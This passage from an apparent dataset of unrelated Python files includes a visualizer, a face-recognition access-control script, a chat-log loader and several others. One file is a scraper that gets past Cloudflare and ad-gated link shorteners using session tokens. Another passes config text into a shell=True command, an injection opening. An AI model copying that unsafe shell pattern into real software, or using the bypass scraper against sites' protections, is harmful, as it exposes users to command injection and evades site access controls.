before_process(self, originalP: StableDiffusionProcessingImg2Img, *args):\r\n        selectable: ScriptSelectable = getattr(originalP, 'selectable_old_sd_firstpasser_script', None)\r\n        if selectable is",
    "from typing import Dict\nfrom .visualizer import * \nfrom typing import Any, Dict, Optional, Tuple\nimport matplotlib.pyplot as plt\nfrom lidardm.visualization.cond2rgb import cond_to_rgb_waymo\nfrom lidardm.planning.utils import * \nimport numpy as np\n\n__all__ = [\"PlanVisualizer\"]\n\nclass PlanVisualizer(Visualizer):\n    def __init__(self, output_key, bev=\"bev\", lidar=\"lidar_seq\", plan=\"plan\", traj_bank_path=None):\n        super().__init__(output_key)\n        self.bev_key = bev\n        self.lidar_key = lidar\n        self.plan_key = plan\n\n        if(traj_bank_path is not None):\n            self.traj_bank = np.load(traj_bank_path)\n        else:\n            self.traj_bank = None\n    \n    def supports_visualization(self, data: Dict[str, Any]) -> bool:\n        return (\"bev\" in data) and (\"lidar\" in data) and (\"plan\" in data)\n\n    def generate_visualization(self, data: Dict[str, Any]) -> bool:\n        \n        w = data['lidar'].shape[2]\n        h = data['lidar'].shape[3]\n\n        fig, ax = plt.subplots(figsize=(h/100, w/100))\n        fig.subplots_adjust(left=0, right=1, top=1, bottom=0)\n\n        #\n        # Specific code\n        #\n\n        b = cond_to_rgb_waymo(data[self.bev_key][0].cpu().detach().numpy())\n\n        ax.imshow(0.5*(np.stack(3*[(np.sum(np.sum(\n            data[self.lidar_key][0].cpu().detach().numpy()[[4]]\n            , 0),0)/4).astype(float)], axis=2)) + 0.5*b)\n\n        if(self.traj_bank is None):\n            waypoints = planning_logit_grid_to_waypoints(data[self.plan_key][0])\n        else: \n            waypoints = logit_grid_to_waypoint_traj_bank_pixel(self.traj_bank, data[self.plan_key][0])\n\n        for points in waypoints:\n            ax.plot((points[1]), (points[0]), 'o', markersize=8)\n        \n\n        #\n        # End. \n        #\n        \n        \n        \n        fig.canvas.draw()\n        image_array = np.array(fig.canvas.renderer.buffer_rgba())\n        plt.close(fig)\n\n        return image_array[:,:,0:3]\n        ",
    "import re\r\nimport requests\r\nfrom curl_cffi import requests as Nreq\r\nimport base64\r\nfrom urllib.parse import unquote, urlparse, quote\r\nimport time\r\nimport cloudscraper\r\nfrom bs4 import BeautifulSoup, NavigableString, Tag\r\nfrom lxml import etree\r\nimport hashlib\r\nimport json\r\nfrom asyncio import sleep as asleep\r\nimport ddl\r\nfrom cfscrape import create_scraper\r\nfrom json import load\r\nfrom os import environ\r\n\r\nwith open('config.json', 'r') as f: DATA = load(f)\r\ndef getenv(var): return environ.get(var) or DATA.get(var, None)\r\n\r\n\r\n##########################################################\r\n# ENVs\r\n\r\nGDTot_Crypt = getenv(\"CRYPT\")\r\nLaravel_Session = getenv(\"Laravel_Session\")\r\nXSRF_TOKEN = getenv(\"XSRF_TOKEN\")\r\nDCRYPT = getenv(\"DRIVEFIRE_CRYPT\")\r\nKCRYPT = getenv(\"KOLOP_CRYPT\")\r\nHCRYPT = getenv(\"HUBDRIVE_CRYPT\")\r\nKATCRYPT = getenv(\"KATDRIVE_CRYPT\")\r\nCF = getenv(\"CLOUDFLARE\")\r\n\r\n############################################################\r\n# Lists\r\n\r\notherslist = [\"exe.io\",\"exey.io\",\"sub2unlock.net\",\"sub2unlock.com\",\"rekonise.com\",\"letsboost.net\",\"ph.apps2app.com\",\"mboost.me\",\r\n\"sub4unlock.com\",\"ytsubme.com\",\"social-unlock.com\",\"boost.ink\",\"goo.gl\",\"shrto.ml\",\"t.co\"]\r\n\r\ngdlist = [\"appdrive\",\"driveapp\",\"drivehub\",\"gdflix\",\"drivesharer\",\"drivebit\",\"drivelinks\",\"driveace\",\r\n\"drivepro\",\"driveseed\"]\r\n\r\n\r\n###############################################################\r\n# pdisk\r\n\r\ndef pdisk(url):\r\n    r = requests.get(url).text\r\n    try: return r.split(\"<!-- \")[-1].split(\" -->\")[0]\r\n    except:\r\n        try:return BeautifulSoup(r,\"html.parser\").find('video').find(\"source\").get(\"src\")\r\n        except: return None\r\n\r\n###############################################################\r\n# index scrapper\r\n\r\ndef scrapeIndex(url, username=\"none\", password=\"none\"):\r\n\r\n    def authorization_token(username, password):\r\n        user_pass = f\"{username}:{password}\"\r\n        return f\"Basic {base64.b64encode(user_pass.encode()).decode()}\"\r\n\r\n          \r\n    def decrypt(string): \r\n        return base64.b64decode(string[::-1][24:-20]).decode('utf-8')  \r\n\r\n    \r\n    def func(payload_input, url, username, password): \r\n        next_page = False\r\n        next_page_token = \"\" \r\n\r\n        url = f\"{url}/\" if url[-1] != '/' else url\r\n\r\n        try: headers = {\"authorization\":authorization_token(username,password)}\r\n        except: return \"username/password combination is wrong\", None, None\r\n\r\n        encrypted_response = requests.post(url, data=payload_input, headers=headers)\r\n        if encrypted_response.status_code == 401: return \"username/password combination is wrong\", None, None\r\n\r\n        try: decrypted_response = json.loads(decrypt(encrypted_response.text))\r\n        except: return \"something went wrong. check index link/username/password field again\", None, None\r\n\r\n        page_token = decrypted_response[\"nextPageToken\"]\r\n        if page_token is None: \r\n            next_page = False\r\n        else: \r\n            next_page = True \r\n            next_page_token = page_token \r\n\r\n\r\n        if list(decrypted_response.get(\"data\").keys())[0] != \"error\":\r\n            file_length = len(decrypted_response[\"data\"][\"files\"])\r\n            result = \"\"\r\n\r\n            for i, _ in enumerate(range(file_length)):\r\n                files_type   = decrypted_response[\"data\"][\"files\"][i][\"mimeType\"]\r\n                if files_type != \"application/vnd.google-apps.folder\":\r\n                        files_name   = decrypted_response[\"data\"][\"files\"][i][\"name\"] \r\n\r\n                        direct_download_link = url + quote(files_name)\r\n                        result += f\"\u2022 {files_name} :\\n{direct_download_link}\\n\\n\"\r\n            return result, next_page, next_page_token\r\n\r\n    def format(result):\r\n        long_string = ''.join(result)\r\n        new_list = []\r\n\r\n        while len(long_string) > 0:\r\n            if len(long_string) > 4000:\r\n                split_index = long_string.rfind(\"\\n\\n\", 0, 4000)\r\n                if split_index == -1:\r\n                    split_index = 4000\r\n            else:\r\n                split_index = len(long_string)\r\n                \r\n            new_list.append(long_string[:split_index])\r\n            long_string = long_string[split_index:].lstrip(\"\\n\\n\")\r\n        \r\n        return new_list\r\n\r\n    # main\r\n    x = 0\r\n    next_page = False\r\n    next_page_token = \"\" \r\n    result = []\r\n\r\n    payload = {\"page_token\":next_page_token, \"page_index\": x}\t\r\n    print(f\"Index Link: {url}\\n\")\r\n    temp, next_page, next_page_token = func(payload, url, username, password)\r\n    if temp is not None: result.append(temp)\r\n    \r\n    while next_page == True:\r\n        payload = {\"page_token\":next_page_token, \"page_index\": x}\r\n        temp, next_page, next_page_token = func(payload, url, username, password)\r\n        if temp is not None: result.append(temp)\r\n        x += 1\r\n        \r\n    if len(result)==0: return None\r\n    return format(result)\r\n\r\n################################################################\r\n# Shortner Full Page API\r\n\r\ndef shortner_fpage_api(link):\r\n  ",
    "import cv2\nimport serial\nimport time\n\n# Load pre-trained face recognition model\nfaceRecognizer = cv2.face.LBPHFaceRecognizer_create()\nfaceRecognizer.read(\"models/trained_lbph_face_recognizer_model.yml\")\n\n# Load Haarcascade for face detection\nfaceCascade = cv2.CascadeClassifier(\"models/haarcascade_frontalface_default.xml\")\n\nfontFace = cv2.FONT_HERSHEY_SIMPLEX\nfontScale = 0.6\nfontColor = (255, 255, 255)\nfontWeight = 2\nfontBottomMargin = 30\n\nnametagColor = (255, 0, 0)\nnametagHeight = 50\n\nfaceRectangleBorderColor = nametagColor\nfaceRectangleBorderSize = 2\n\n# Open a connection to the Arduino\nser = serial.Serial('/dev/tty.usbmodem2017_2_251', 9600)  # Change port to your Arduino's port\ntime.sleep(2)  # Allow time for Arduino to initialize\n\n# Open a connection to the first webcam\ncamera = cv2.VideoCapture(0)\n\n# Start looping\nwhile True:\n    # Capture frame-by-frame\n    ret, frame = camera.read()\n    if not ret:\n        break\n\n    # Convert frame to grayscale\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n    # Detect faces\n    faces = faceCascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\n\n    # Control flag for LED\n    is_access_granted = False\n\n    # For each face found\n    for (x, y, w, h) in faces:\n\n        # Recognize the face\n        ID, Confidence = faceRecognizer.predict(gray[y:y + h, x:x + w])\n        # Confidence normalization to a 0-100 scale\n        Confidence = 100 - Confidence\n        if Confidence > 50:\n            if ID == 0:\n                Person = \"pseudo\"\n                is_access_granted = False\n            elif ID == 1:\n                Person = \"Gabriel\"\n                is_access_granted = False\n            elif ID == 2:\n                Person = \"Dalyoung\"\n                is_access_granted = False\n            elif ID == 3:\n                Person = \"Godwill\"\n                is_access_granted = False\n            elif ID == 4:\n                Person = \"Bright\"\n                is_access_granted = False\n            elif ID == 5:\n                Person = \"Bena\"   \n                is_access_granted = False    \n            elif ID == 6:\n                Person = \"Sugira\"   \n                is_access_granted = True   \n        \n            # Create rectangle around the face\n            cv2.rectangle(frame, (x - 20, y - 20), (x + w + 20, y + h + 20), faceRectangleBorderColor, faceRectangleBorderSize)\n\n            # Display name tag\n            cv2.rectangle(frame, (x - 22, y - nametagHeight), (x + w + 22, y - 22), nametagColor, -1)\n            cv2.putText(frame, str(Person) + \": \" + str(round(Confidence, 2)) + \"%\", (x, y-fontBottomMargin), fontFace, fontScale, fontColor, fontWeight)\n\n    # Control\n    if is_access_granted:\n        ser.write(b'1')  # Sending '1' to Arduino to turn on LED\n    else:\n        ser.write(b'0')  # Sending '0' to Arduino to turn off LED\n\n    # Display the resulting frame\n    cv2.imshow('Detecting Faces...', frame)\n\n    # Exit loop when 'q' is pressed\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\n# Release the camera\ncamera.release()\n\n# Close the serial connection to the Arduino\n\nser.write(b'0')  # Sending '0' to Arduino to turn off LED\nser.close()\n\n# Close all OpenCV windows\ncv2.destroyAllWindows()\n",
    "import dearpygui.dearpygui as dpg\nimport subprocess\n\ndpg.create_context()\ndpg.create_viewport(title=\"pause my game\", width=440, height=480)\n\n# \u516c\u5171\u51fd\u6570\ndef runinsubprocess(thing):\n    creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP |subprocess.CREATE_BREAKAWAY_FROM_JOB\n    subprocess.Popen(thing, shell=True, creationflags=creation_flags,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n# \u6309\u94ae\u51fd\u6570\ndef loadconfig():\n    with open('game_name.txt', 'r') as f:\n        game_name = f.read().splitlines()\n    dpg.configure_item('game_name_exe', items=game_name)\n    dpg.set_value('infotext' , 'Game loaded: ' + str(len(game_name)) + ' games')\n    # \u81ea\u52a8\u9009\u62e9 \u7b2c\u4e00\u4e2a\n    if len(game_name) > 0:\n        dpg.set_value('game_name_exe', game_name[0])\n\ndef editconfig():\n    runinsubprocess('notepad game_name.txt')\n\ndef pausegame():\n    dpg.configure_item('indicator', default_value='Game Paused' , color=(255,0,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend ' + game_name)\n\ndef resumegame():\n    dpg.configure_item('indicator', default_value='Game Resumed' , color=(0,255,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend -r ' + game_name)\n\ndef opentaskmgr():\n    runinsubprocess('taskmgr')\n\n# \u52a0\u8f7d\u5b57\u4f53\nwith dpg.font_registry():\n    with dpg.font(\"afont.ttf\", 18) as font1:  # \u589e\u52a0\u4e2d\u6587\u7f16\u7801\u8303\u56f4\uff0c\u6570\u5b57\u662f\u5b57\u53f7,\u4f1a\u6bd4\u5b98\u65b9\u5b57\u4f53\u6a21\u7cca\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Default)\n        dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Simplified_Common)\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Full)\n    dpg.bind_font(font1)\n\n# \u7a97\u4f53\u4e3b\u51fd\u6570\nwith dpg.window(label='pauser',  width=400, height=400,pos=(10, 10)):\n    # dpg.add_input_text(default_value='PsSuspend DevilMayCry5.exe' , tag='pause_DevilMayCry5_cmd')\n    # dpg.add_input_text(default_value='PsSuspend -r DevilMayCry5.exe ' , tag='remuse_DevilMayCry5_cmd')\n\n    dpg.add_combo(default_value='' , items=['XXX.exe'], tag='game_name_exe')\n    dpg.add_text(default_value='Game Status untouched' , color=(120,120,120) ,tag='indicator')\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='Pause', callback=pausegame);dpg.add_same_line()\n    dpg.add_button(label='Resume', callback=resumegame);dpg.add_same_line()\n    dpg.add_button(label='Taskmgr', callback=opentaskmgr)\n    dpg.add_spacing(count=3)\n    dpg.add_separator()\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='reload config', callback=loadconfig);dpg.add_same_line()\n    dpg.add_button(label='edit config', callback=editconfig)\n    dpg.add_text(tag='infotext', default_value='Game loaded:', color=(120,120,120))\n    # dpg.show_documentation()\n# onload \u4e8b\u4ef6\nloadconfig()\n\ndpg.setup_dearpygui()\ndpg.show_viewport()\ndpg.start_dearpygui()\ndpg.destroy_context()",
    "from pathlib import Path\nimport re\n\nfrom easy_io import read_json, dump_str_list_to_txt_file\n\nfrom src.path import baseline_performance_dir, baseline_table_dir\nfrom src.config import new_datasets_names, covnert_dataset_name_dict, new_datasets_initial_models, baseline_models_open, baseline_models_closed, convert_category_name_dict\nfrom src.baseline.prompt import simple_prompt_baseline_prompts_dict, advanced_prompt_dict\n\n\ncategory_table_dir = baseline_table_dir / \"category_results_tables\"\n\n\nif __name__ == \"__main__\":\n    baseline_table_dir.mkdir(parents=True, exist_ok=True)\n    \n    baseline_models = baseline_models_open + baseline_models_closed\n    easy_baseline_performance = read_json(baseline_performance_dir / \"easy_baseline\" / \"performance.json\")\n    human_performance = read_json(baseline_performance_dir / \"human_performance.json\")\n    \n    for baseline_name in [\"simple_prompt_baseline\"]:\n        performance_dict: dict[str, dict[str, dict[str, dict]]] = read_json(baseline_performance_dir / baseline_name / \"performance.json\")\n\n        if baseline_name == \"simple_prompt_baseline\":\n            prompt_names_list = list(simple_prompt_baseline_prompts_dict.keys()) + [\"average\"]\n        else:\n            prompt_names_list = list(advanced_prompt_dict.keys())\n        \n        for prompt_name in prompt_names_list:\n            prompt_key = \"average\" if prompt_name == \"average\" else f\"prompt={prompt_name}\"\n            \n            for metric in [\"accuracy\", \"f1\", \"precision\", \"recall\"]:\n                output_dir = baseline_table_dir / baseline_name / metric\n                output_dir.mkdir(parents=True, exist_ok=True)\n                \n                # build latex table\n                first_row =  f\"{'initial model':>30s} & {'dataset':>30s} & \" + \" & \".join([f\"{s.split('/')[-1]:>30s}\" for s in baseline_models + [\"random\", \"human\"]]) + \"  \\\\\\\\\"\n                latex_table_lines = [first_row]\n                \n                for initial_model_name in new_datasets_initial_models:\n                    datasets_list = new_datasets_names\n                    if baseline_name == \"simple_prompt_baseline\":\n                        datasets_list = datasets_list # + [\"average\"]\n                    \n                    for dataset_name in datasets_list:\n                        if dataset_name == \"average\" and prompt_name != \"average\":\n                            continue\n                        \n                        converted_dataset_name = \"Average\" if dataset_name == \"average\" else covnert_dataset_name_dict[dataset_name]\n                        dataset_name_str = f\"\\scalebox{{0.9}}[1]{{{converted_dataset_name}}}\"\n                        row_list = [f\"{'':>30s}\", f\"{dataset_name_str:>30s}\"]\n                        \n                        performance_list: list[float] = []\n                        for baseline_model_name in baseline_models:\n                            baseline_model_performance = performance_dict[dataset_name][f\"initial_model={initial_model_name}\"].get(f\"baseline_model={baseline_model_name}\")\n                            \n                            if baseline_model_performance is None or len(baseline_model_performance[prompt_key]) == 0:\n                                performance_list.append(-1)\n                            else:\n                                value = baseline_model_performance[prompt_key][\"metrics\"][metric]\n                                if prompt_key == \"average\":\n                                    value = value[\"average\"]\n                                \n                                performance_list.append(value * 100)\n                        \n                        # easy baseline\n                        random_performance = easy_baseline_performance[dataset_name][f\"initial_model={initial_model_name}\"][\"baseline_model=random\"][\"metrics\"][metric] * 100\n                             \n                        # make top n bold\n                        top_n = 1\n                        top_n_indices = sorted(range(len(performance_list)), key=lambda i: performance_list[i], reverse=True)[:top_n]\n                        for idx, val in enumerate(performance_list):\n                            if idx in top_n_indices:\n                                performance_str = f\"\\\\textbf{{{val:.1f}}}\"\n                                row_list.append(f\"{performance_str:>30s}\")\n                            elif val < random_performance:\n                                row_list.append(f\"\\\\cellcolor[RGB]{{211,211,211}}{{{val:.1f}}}\")\n                            elif val == -1:\n                                row_list.append(f\"{'':>30s}\")\n                            else:\n                                row_list.append(f\"{val:30.1f}\")\n                        \n                        # # always error baseline\n                        # always_error_performance = easy_baseline_performance[dataset_name][f\"initial_model={initial_model_name}\"][\"baseline_model=always_error\"][\"metrics\"][metric] * 100\n                  ",
    "import re\nfrom typing import Iterator\nfrom langchain_core.documents import Document\nfrom langchain_community.document_loaders.helpers import detect_file_encodings\nimport pandas as pd\nfrom langchain_community.document_loaders import CSVLoader\nfrom datetime import datetime\n\n\nclass KaKaoTalkLoader(CSVLoader):\n    def __init__(self, file_path: str, file_suffix:str, encoding: str = \"utf8\", **kwargs):\n        super().__init__(file_path, encoding=encoding, **kwargs)\n        # NOTE - choh(2024.04.05) - \ud30c\uc77c \ud655\uc7a5\uc790 \ubcc0\uc218 \ucd94\uac00\n        self.file_suffix = file_suffix\n    \n    def anonymize_user_id(self, user_id, num_chars_to_anonymize=3):\n        \"\"\"\n        \ube44\uc2dd\ubcc4\ud654 \ud568\uc218\ub294 \uc8fc\uc5b4\uc9c4 \uc0ac\uc6a9\uc790 ID\uc758 \uc55e\ubd80\ubd84\uc744 '*'\ub85c \ub300\uccb4\ud558\uc5ec \ube44\uc2dd\ubcc4\ud654\ud569\ub2c8\ub2e4.\n\n        :param user_id: \ube44\uc2dd\ubcc4\ud654\ud560 \uc0ac\uc6a9\uc790 ID\n        :param num_chars_to_anonymize: \ube44\uc2dd\ubcc4\ud654\ud560 \ubb38\uc790 \uc218\n        :return: \ube44\uc2dd\ubcc4\ud654\ub41c \uc0ac\uc6a9\uc790 ID\n        \"\"\"\n        # \ube44\uc2dd\ubcc4\ud654\ud560 \ubb38\uc790 \uc218\uac00 \uc0ac\uc6a9\uc790 ID\uc758 \uae38\uc774\ubcf4\ub2e4 \uae38 \uacbd\uc6b0, \uc804\uccb4 ID\ub97c '*'\ub85c \ub300\uccb4\n        if num_chars_to_anonymize >= len(user_id):\n            num_chars_to_anonymize = len(user_id) - 1\n            return \"*\" * num_chars_to_anonymize\n\n        # \uc55e\ubd80\ubd84\uc744 '*'\ub85c \ub300\uccb4\ud558\uace0 \ub098\uba38\uc9c0 \ubd80\ubd84\uc744 \uc6d0\ubcf8 ID\uc5d0\uc11c \uac00\uc838\uc634\n        anonymized_id = \"*\" * num_chars_to_anonymize + user_id[num_chars_to_anonymize:]\n\n        return anonymized_id\n    \n    # NOTE - choh(2024.04.05) - 12\uc2dc\uac04\uc81c\ub97c 24\uc2dc\uac04\uc81c\ub85c \ubcc0\ud658\n    def process_time_to_24hr_format(self, date_obj, time_str):\n        \"\"\"\n        \ub300\ud654 \ub0b4\uc6a9\uc911\uc5d0 \uc2dc\uac04 \ud45c\uc2dc\uac00 '\uc624\uc804 12:23', '\uc624\ud6c4 11:23'\uacfc \uac19\uc774 12\uc2dc\uac04\uc81c\ub85c \ub418\uc5b4 \uc788\ub294 \uacbd\uc6b0, \n        \uc774\ub97c 24\uc2dc\uac04\uc81c\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4.\n        \n        :param date_obj: \ub300\ud654 \ub0b4\uc6a9\uc758 \ub0a0\uc9dc \uc815\ubcf4\uac00 \ub2f4\uae34 datetime \uac1d\uccb4\n        :praam time_str: \ub300\ud654 \ub0b4\uc6a9\uc758 \uc2dc\uac04 \uc815\ubcf4\uac00 \ub2f4\uae34 \ubb38\uc790\uc5f4\n        :return: 24\uc2dc\uac04\uc81c\ub85c \ubcc0\ud658\ub41c datetime \uac1d\uccb4\n        \"\"\"\n        \n        # '\uc624\uc804/\uc624\ud6c4' \ubd80\ubd84\uacfc \uc2dc\uac04 \ubd80\ubd84\uc744 \ubd84\ub9ac\ud569\ub2c8\ub2e4.\n        period, time_part = time_str.split(' ', 1)\n        \n        # \uc2dc\uac04 \ubd80\ubd84\uc744 \uc2dc\uc640 \ubd84\uc73c\ub85c \ub2e4\uc2dc \ubd84\ub9ac\ud569\ub2c8\ub2e4.\n        hour, minute = map(int, time_part.split(':'))\n        \n        # '\uc624\ud6c4'\uc778 \uacbd\uc6b0 12\ub97c \ub354\ud558\ub418, '\uc624\ud6c4 12\uc2dc'\ub294 \uc81c\uc678\ud569\ub2c8\ub2e4.\n        if period == '\uc624\ud6c4' and hour != 12:\n            hour += 12\n        # '\uc624\uc804 12\uc2dc'\ub294 0\uc2dc\ub85c \ucc98\ub9ac\ud569\ub2c8\ub2e4.\n        elif period == '\uc624\uc804' and hour == 12:\n            hour = 0\n        \n        # date_obj\uacfc \uacb0\ud569\ud558\uc5ec \ucd5c\uc885 datetime \uac1d\uccb4\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4.\n        # \uc5ec\uae30\uc11c datetime \ud568\uc218\ub294 \uc704\uc5d0\uc11c \uc784\ud3ec\ud2b8\ud55c datetime \ud074\ub798\uc2a4\ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4.\n        combined_datetime = datetime(date_obj.year, date_obj.month, date_obj.day, hour, minute)\n        \n        # pandas\uc758 to_datetime \ud568\uc218\ub97c \uc0ac\uc6a9\ud558\uc5ec pandas.Timestamp \uac1d\uccb4\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4.\n        return pd.to_datetime(combined_datetime)\n    \n    # NOTE - choh(2024.04.05) - \ub300\ud654\ubaa9\ub85d\uc758 \ub0a0\uc9dc \ubcc0\ud658 \ubd80\ubd84\uc744 \ud30c\uc2f1\n    def process_date(self, line: str) -> tuple:\n        \"\"\"\n        -------- 2024\ub144 4\uc6d4 5\uc77c \ud654\uc694\uc77c -------- \ud615\ud0dc\uc758 \ub0a0\uc9dc\ub97c \ud30c\uc2f1\ud558\uace0,\n        \ud30c\uc2f1 \uc131\uacf5 \uc5ec\ubd80\uc640 \ud568\uaed8 \ud30c\uc2f1\ub41c \ub0a0\uc9dc \ub610\ub294 \uc6d0\ub798 \ubb38\uc790\uc5f4\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4.\n        \n        :param line: \ub0a0\uc9dc \ubb38\uc790\uc5f4\n        :return: (\ud30c\uc2f1 \uc131\uacf5 \uc5ec\ubd80, \ud30c\uc2f1\ub41c \ub0a0\uc9dc \ub610\ub294 \uc6d0\ub798 \ubb38\uc790\uc5f4)\n        \"\"\"\n        # -------- 2024\ub144 4\uc6d4 5\uc77c \ud654\uc694\uc77c -------- \ub0a0\uc9dc\uac00 \uc774\uc0c1\ud0dc\uc784\n        date_match = re.match(r'[-]+ (\\d+\ub144 \\d+\uc6d4 \\d+\uc77c) [^\\d]+', line)\n        if date_match:\n            # 2024\ub144 4\uc6d4 5\uc77c, \ud615\ud0dc\uc758 \ub0a0\uc9dc \ucd94\ucd9c\n            date_pattern = re.compile(r'(\\d+)\ub144 (\\d+)\uc6d4 (\\d+)\uc77c')\n            match = date_pattern.search(date_match.group(1))\n            if match:\n                year, month, day = map(int, match.groups())\n                return (True, pd.to_datetime(f\"{year}-{month}-{day}\"))\n        return (False, line)\n\n    # NOTE - choh(2024.04.05) - __read_file\uc744 \ud14c\uc2a4\ud2b8 \ud558\uae30 \uc704\ud55c wrapper \ud568\uc218\n    def _read_file_test(self, csvfile) -> Iterator[Document]:\n        \"\"\"\ud14c\uc2a4\ud2b8\ub97c \uc704\ud55c \ub798\ud37c \ud568\uc218\"\"\"\n        return self.__read_file(csvfile)\n    \n    def __read_file(self, csvfile) -> Iterator[Document]:\n        # NOTE - choh(2024.04.05) - TXT \ud615\ud0dc\uc758 \ub300\ud654 \uba54\uc138\uc9c0 \uc0ac\uc804 \ucc98\ub9ac\n        if self.file_suffix == \".txt\":\n            \n            # \uc804\ub0a0 \ub0a0\uc9dc \ubcc0\uc218 \ucd08\uae30\ud654\n            temp_date = None\n            i = 0 # \ud589 \ubc88\ud638\n            for line in csvfile:\n                \n                # \uc774\ubc88 \uc904\uc774 \ub0a0\uc9dc\uac00 \ub9de\uc73c\uba74 is_parsed=True, result\ub294 \ub0a0\uc9dc\n                is_parsed, result = self.process_date(line)\n                \n                # \ud30c\uc2f1\ud55c \ubb38\uc790\uc5f4\uc774 \ub0a0\uc9dc \ud328\ud134\uc5d0 \ub9de\uc73c\uba74, \ub0a0\uc9dc\ub97c \uc800\uc7a5\n                if is_parsed:\n                    temp_date = result\n                \n                # \ub0a0\uc9dc\uac00 \uc544\ub2c8\uba74, \uccb4\ud305\uc774\uae30 \ub54c\ubb38\uc5d0, \uccb4\ud305\uc744 \ud328\ud134 \ub9e4\uce6d\n                else:\n                    # \ucd08\uae30\uac12 \uc124\uc815\n                    user = None\n                    time_12hr = None\n                    message = None\n\n                    # \ub300\ud654 \ud328\ud134 \ucc3e\uae30\n                    conversation_match = re.match(r'\\[([^\\]]+)\\] \\[([^\\]]+)\\] (.+)', line)\n                    if conversation_match:\n                        user_real = conversation_match.group(1)\n                        time_12hr = conversation_match.group(2)\n                        message = conversation_match.group(3).strip()\n                        \n                        # \uc2dc\uac04\uc744 24\uc2dc\uac04\uc81c\ub85c \ubcc0\ud658                        \n                        date = self.process_time_to_24hr_format(temp_date, time_12hr)\n                        # \uc0ac\uc6a9\uc790 ID \ube44\uc2dd\ubcc4\ud654\n                        user = self.anonymize_user_id(user_real)\n                        \n                        content = f'\"User: {user}, Message: {message}'\n                        \n                        metadata = {\n                            \"date\":  date.strftime(\"%Y-%m-%d %H:%M:%S\"),\n                            \"year\": ",
    "import json\nfrom vllm import LLM, SamplingParams\nfrom openai import OpenAI\nimport requests\nfrom inference_util import *\nfrom prompts import DEFAULT_REASONING_PROMPT\n\nSYSTEM_MESSAGES = {\n    \"default\": \"You are a helpful assistant.\",\n    \"svg_expert\": \"You are a helpful assistant specially trained in understanding, interpreting, and responding to questions about SVG (Scalable Vector Graphics) code.\"\n}\nDEFAULT_GENERATION_CONFIGS = {\n    \"temperature\": 0.0,\n    \"max_tokens\": 8192,\n    \"top_p\": 1.0,\n}\ndef call_chat_api(client, hosted_model_id, messages, generation_configs = DEFAULT_GENERATION_CONFIGS):\n    query_obj = {\n        \"model\": hosted_model_id,\n        \"messages\": messages,\n        **generation_configs\n    }\n    chat_response = client.chat.completions.create(**query_obj)\n    return chat_response\n\ndef setup_client(\n        openai_api_key = \"EMPTY\", \n        openai_api_base = \"http://localhost:8000/v1\"\n    ):\n    client = OpenAI(\n        api_key=openai_api_key,\n        base_url=openai_api_base,\n    )\n    return client\n\ndef get_perception_from_pvd_responses(responses):\n    perception_objs = {}\n    for key, item in responses.items():\n        obj = json.loads(item['response'])\n        if not isinstance(obj, list):\n            obj = [obj]\n        perception_objs[f\"object_{len(perception_objs)}\"] = obj\n    return perception_objs\n\nimport argparse\nif __name__ == \"__main__\":\n    # === set up input ===\n    \n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--img_path\", type=str, default=\"demo_examples/image_inputs/lines_segments.png\")\n    parser.add_argument(\"--question\", type=str, default=\"What is the total length of the lines?\")\n    parser.add_argument(\"--output_root\", type=str, default=\"demo_examples/perception_output\")\n    args = parser.parse_args()\n\n    svg_conversion_method = \"raw_svg_individual_paths_w_rec_check\"\n    resize_image_before_conversion = False\n\n    # === set up model client ===\n    openai_api_key = \"EMPTY\"\n    openai_api_base = \"http://localhost:8000/v1\"\n\n    print(f\"try automatically find the hosted model id...\")\n    model_list_data = requests.get(f\"{openai_api_base}/models\").json()\n    model_id = model_list_data[\"data\"][0][\"id\"]\n    print(f\"Using model: {model_id}\")\n\n    client = setup_client(openai_api_base=openai_api_base, openai_api_key=openai_api_key)\n\n    generation_configs = DEFAULT_GENERATION_CONFIGS\n    print(\"generation_configs:\", generation_configs)\n\n    model_version = model_id.split(\"/\")[-1]\n    img_2_svg_configs=CONFIGS[\"default\"]\n\n    img_path = args.img_path\n    if \"geoclidean\" in img_path or \"nlvr\" in img_path:\n        diff_threshold = 5e-6\n    else:\n        diff_threshold = 5e-4\n\n    img_base_name = os.path.basename(img_path)\n    \n    output_dir = f\"{args.output_root}/{model_version}/{img_base_name}\"\n\n    output_perception_dir = f\"{output_dir}/output_perception\"\n    svg_output_dir=f\"{output_dir}/svg\"\n    \n    if resize_image_before_conversion:\n        tmp_img_path = f\"./tmp_img.png\"\n        img_path = resize_image(img_path, tmp_img_path, new_width=512)\n\n    os.makedirs(output_dir, exist_ok=True)\n    # save original image\n    img = Image.open(img_path)\n    img.save(f\"{output_dir}/input_img.png\")\n    \n    svg_strs, svg_paths = img_2_svg_strs(method=svg_conversion_method, img_path=img_path, svg_config=img_2_svg_configs, svg_output_dir=svg_output_dir, topk_paths=30, diff_threshold=diff_threshold)\n\n    # rm tmp_img_path\n    if resize_image_before_conversion and os.path.exists(tmp_img_path):\n        os.remove(tmp_img_path)\n\n    # === inference ===\n    inputs = []\n    responses = []\n    for i, svg_str in enumerate(svg_strs):\n        print(f\"svg_str {i}:\", svg_str)\n        \n        prompt = get_prompt_general_from_svg_str(svg_str, \"Describe the visual content of the image in a JSON format.\")\n        system_prompt = SYSTEM_MESSAGES[\"svg_expert\"]\n        \n        # ===============\n        messages = [\n            {\n                \"role\": \"system\",\n                \"content\": system_prompt\n            },\n            {\n                \"role\": \"user\",\n                \"content\": prompt\n            }\n        ]\n        # ===============\n        print(\"input messages:\", messages)\n\n        query_obj = {\n            \"model\": model_id,\n            